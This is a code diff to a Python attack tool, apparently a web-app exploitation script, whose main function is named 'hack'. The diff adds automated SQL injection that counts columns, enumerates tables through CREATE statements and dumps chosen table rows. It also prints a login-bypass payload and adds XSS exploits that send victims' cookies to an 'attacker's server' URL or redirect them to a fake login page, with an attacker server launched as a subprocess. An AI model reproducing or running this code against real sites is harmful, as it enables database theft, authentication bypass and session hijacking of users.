@@ -1,7 +1,137 @@
-import json, requests, subprocess
+import json, requests, subprocess, time
 from vuln_page import VulnPage, POST_REQ, GET_REQ, APOSTROPHE, QUOTE 
+from bs4 import BeautifulSoup
 
-#this will be a method and login will be a parameter that's the url 
+def get_column_names(table_enum, table_name):
+	column_names = []
+	for x in table_enum:
+		x = x.replace('\n', '')
+		x = x.replace('\t', ' ')
+		x = x.split('(', 1)
+		if table_name in x[0]: 
+			columns = x[1].replace('(', '')
+			columns = columns.split(',')
+			for name in columns:
+				if 'PRIMARY' in name or 'FOREIGN' in name:
+					continue
+				name = name.strip().split()
+				column_names.append(name[0])
+
+	return column_names
+
+def table_data(col_str, table_enum, table_name, session, payload, page):
+	columns = get_column_names(table_enum, table_name)
+	if 'id' in columns:
+		columns.remove('id')
+	for x in range(min(len(col_str), len(columns))):
+		col_str[x] = columns[x]
+	col_str = ['1'] + col_str
+	col_str.pop()
+	payload = payload.replace("[CHANGE_THIS]", ",".join(col_str), 1)
+	payload = payload.replace("[CHANGE_THIS]", table_name, 1)
+	print(payload)
+
+	data = page.get_data()
+	for x in data.keys():
+		data[x] = payload
+
+	if session:
+		controller = session
+	else:
+		controller = requests
+
+	if page.req_type == GET_REQ:
+		resp = controller.get(page.url, params=data)
+	else:
+		resp = controller.post(page.url, data=data)
+
+
+	if "Error" in resp.text or "error" in resp.text:
+		print("Unsuccessful!")
+		return
+
+	data = []
+	html = BeautifulSoup(resp.content, 'html.parser')
+	table = html.find('table')
+	table_body = table.find('tbody')
+	rows = table_body.find_all('tr')
+	for row in rows:
+	    cols = row.find_all('td')
+	    cols = [ele.text.strip() for ele in cols]
+	    data.append([ele for ele in cols if ele]) # Get rid of empty values
+	
+	print()
+	print("Data found!")
+	table_enum = []
+	col_str.pop(0)
+	print(", ".join(col_str))
+	for row in data:
+		print(", ".join(row))
+
+
+def table_enumeration(gen_payload, session, page):
+	bad_result = True
+	column_count = 1
+	col_str = []
+	while bad_result:
+		if column_count > 12:
+			break;
+
+		data = page.get_data()
+		col_str = [str(1) for x in range(column_count)]
+
+		if len(col_str) > 1:
+			col_str[1] = "sql"
+		else:
+			col_str[0] = "sql"
+
+		rep_str = gen_payload.replace("[CHANGE_THIS]", ",".join(col_str))
+		print("Trying: " + rep_str)
+
+		for x in data.keys():
+			data[x] = rep_str
+
+		if session:
+			controller = session
+		else:
+			controller = requests
+
+		if page.req_type == GET_REQ:
+			resp = controller.get(page.url, params=data)
+		else:
+			resp = controller.post(page.url, data=data)
+
+
+		if "Error" in resp.text or "error" in resp.text:
+			column_count += 1
+		else:
+			bad_result = False
+
+	print()
+	if bad_result:
+		print("Table enumeration unsuccessful!")
+		return []
+
+	print("Table enumeration completed! Here are the tables:")
+
+	data = []
+	html = BeautifulSoup(resp.content, 'html.parser')
+	table = html.find('table')
+	table_body = table.find('tbody')
+	rows = table_body.find_all('tr')
+	for row in rows:
+	    cols = row.find_all('td')
+	    cols = [ele.text.strip() for ele in cols]
+	    data.append([ele for ele in cols if ele]) # Get rid of empty values
+	
+	table_enum = []
+	for row in data:
+		for column in row:
+			if 'CREATE' in column:
+				print(column)
+				table_enum.append(column)
+
+	return col_str, table_enum
 
 def get_input(data, input_str, invalid_str):
 	while True:
@@ -19,17 +149,48 @@ def get_input(data, input_str, invalid_str):
 			break
 	return choices
 
-def get_payload_missing_info(process, exploit, add_info=None):
-	if exploit["name"] == "exploit_1":
-		if process:
-			return "http://127.0.0.1:8081/fake?url={}".format(add_info)
-		else:
-			url = input("Please enter the attacker's server's URL that creates a fake login page (including http://): ")
-			param = input("Please enter the param name that the get request takes for the login page: ")
-			return url.strip() + "?" + param.strip() + "=" + add_info.strip()
-	elif exploit["name"] == "exploit_2":
-		url = input("Please enter the url you would like to redirect to: ")
-		return url.strip() 
+def check_output(resp, payload, exploit):
+	print(payload)
+	print("SUCCESS!")
+	return
+
+def fix_payload(vuln_type, process, exploit, session, page, add_info=None):
+	if vuln_type == "XSS":
+		if exploit["name"] == "exploit_1":
+			if process:
+				return ["http://127.0.0.1:8081/fake?url={}".format(add_info)]
+			else:
+				url = input("Please enter the attacker's server's URL that creates a fake login page (including http://): ")
+				param = input("Please enter the param name that the get request takes for the login page: ")
+				return [url.strip() + "?" + param.strip() + "=" + add_info.strip()]
+		elif exploit["name"] == "exploit_2":
+			url = input("Please enter the url you would like to redirect to: ")
+			return [url.strip()] 
+		elif exploit["name"] == "exploit_3":
+			if process:
+				return ["http://127.0.0.1:8081/fake?cookie="]
+			else:
+				url = input("Please enter the attacker's server's GET URL that accepts a cookie (including http://): ")
+				param = input("Please enter the param name that the get request uses for the cookie: ")
+				return [url.strip() + "?" + param.strip() + "="]
+	elif vuln_type == "SQL":
+		if exploit["name"] == "exploit_1":
+			print("Testing login injections...")
+			time.sleep(3)
+			print("This injection allows you to authorize without any credentials.")
+			print("Run the script again and pass in the following for both username and password:")
+			print(exploit["payload"])
+			return[-1]
+		if exploit["name"] == "exploit_2":
+			print("Enumerating tables...")
+			table_enumeration(exploit["payload"], session, page)
+			return [-1]
+		if exploit["name"] == "exploit_3":
+			col_str, table_enum = table_enumeration(exploit["payload_def"], session, page)
+			table_name = input("Enter the name of table you would like to see (case-sensitive): ")
+			table_data(col_str, table_enum, table_name,session, exploit["payload"], page)
+			print()
+			return[-1]
 
 
 def hack(login, vulnerabilities, session=None):
@@ -40,7 +201,8 @@ def hack(login, vulnerabilities, session=None):
 	while answer != 'y' and answer != 'Y' and answer == 'N' and answer == 'n':
 		answer = input("Invalid input. Please enter either Y/n or N/n: ")
 	if answer == 'Y' or answer == 'y':
-		process = subprocess.Popen(['python3', 'attacker_server.py'], stdout=subprocess.STD, stderr=subprocess.STDOUT)
+		#, stdout=subprocess.STDOUT, stderr=subprocess.STDOUT
+		process = subprocess.Popen(['python3', 'attacker_server.py'])
 	else:
 		process = None
 
@@ -88,15 +250,15 @@ def hack(login, vulnerabilities, session=None):
 
 		print()
 		print("Exploit selected: {}\n".format(selected_exploit["name"]))
-		payload = selected_exploit["payload"]
-		if "[CHANGE_THIS]" in payload:
-				url = get_payload_missing_info(process, selected_exploit, add_info=login)
-				payload = payload.replace("[CHANGE_THIS]", url)
-		print()
 
-		print(payload)
-		print("Sending in customized payload now!")
-		print("Success!")
+		payload = selected_exploit["payload"]
+		sub = fix_payload(selected_vuln.strip(), process, selected_exploit, session, selected_page, add_info=login)
+		if sub[0] == -1:
+			test = input("Continue to next page?")
+			continue
+		for x in sub:
+			payload = payload.replace("[CHANGE_THIS]", x, 1)
+
 
 		data = selected_page.get_data()
 		for x in data.keys():
@@ -112,10 +274,14 @@ def hack(login, vulnerabilities, session=None):
 		else:
 			resp = controller.post(selected_page.url, data=data)
 
+		check_output(resp, payload, selected_exploit)
+
 		#with open("test_" + str(choice) + ".html", 'w') as out_file:
 		#	out_file.write(resp.text)
 
-		test = input("Continue to next page?")
+		test = input("Continue to next page? Enter Y/y or N/n: ")
+		if test == 'N' or test == 'n':
+			break;
 
 
 	
